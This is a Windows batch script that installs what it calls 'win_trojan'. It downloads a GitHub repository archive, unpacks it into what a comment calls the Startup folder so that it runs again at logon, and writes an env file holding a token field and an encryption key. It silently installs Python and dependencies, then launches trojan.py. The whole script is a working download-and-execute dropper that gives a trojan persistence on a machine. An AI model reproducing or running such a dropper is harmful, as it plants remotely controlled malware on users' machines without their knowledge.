@echo off
SETLOCAL EnableDelayedExpansion

:: --- Configuration ---
SET "REPO_URL=https://github.com/Noah-school/win_trojan/archive/refs/heads/main.zip"
SET "ZIP_FILE=%TEMP%\win_trojan_dl.zip"
SET "TEMP_EXTRACT=%TEMP%\win_trojan_temp"
SET "PYTHON_EXE=python"

:: Set working directory to the Startup folder where this .bat lives
cd /d "%~dp0"

echo [*] Target Directory: %CD%

:: 1. Download the repository zip
echo [*] Downloading files...
powershell -Command "Invoke-WebRequest -Uri '%REPO_URL%' -OutFile '%ZIP_FILE%'"
if %ERRORLEVEL% neq 0 (
    echo [!] Download failed.
    pause
    exit /b
)

:: 2. Extract to a TEMP location
echo [*] Extracting...
if exist "%TEMP_EXTRACT%" rd /S /Q "%TEMP_EXTRACT%"
powershell -Command "Expand-Archive -Path '%ZIP_FILE%' -DestinationPath '%TEMP_EXTRACT%' -Force"

:: 3. Move contents from trojan-main to the Startup folder
echo [*] Moving files to %CD%...
xcopy "%TEMP_EXTRACT%\win_trojan-main\*" "." /E /H /Y /Q

:: 4. Cleanup Temp Data
rd /S /Q "%TEMP_EXTRACT%"
del "%ZIP_FILE%"

:: 5. Update the env file with Pastebin content
echo [*] Configuring env file...
(
echo GH_TOKEN=
echo REPO_NAME=win_trojan
echo USER_NAME=Noah-school
echo ENCRYPTION_KEY=9e04682e8b9197f4900bf2c58347e8d4
) > env

:: 6. Python Check and Silent Install
%PYTHON_EXE% --version >nul 2>&1
if %ERRORLEVEL% neq 0 (
    echo [!] Python not found. Installing...
    powershell -Command "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe' -OutFile '%TEMP%\py_inst.exe'"
    start /wait %TEMP%\py_inst.exe /quiet InstallAllUsers=1 PrependPath=1
    del %TEMP%\py_inst.exe
    SET "PATH=%PATH%;%ProgramFiles%\Python311\;%ProgramFiles%\Python311\Scripts\"
)

:: 7. Install Dependencies
if exist "requirements.txt" (
    echo [*] Installing requirements...
    %PYTHON_EXE% -m pip install -r requirements.txt
)

:: 8. Run the main script
if exist "trojan.py" (
    echo [*] Success. Launching trojan.py...
    start "" %PYTHON_EXE% trojan.py
) else (
    echo [!] Error: trojan.py not found.
    pause
)

exit
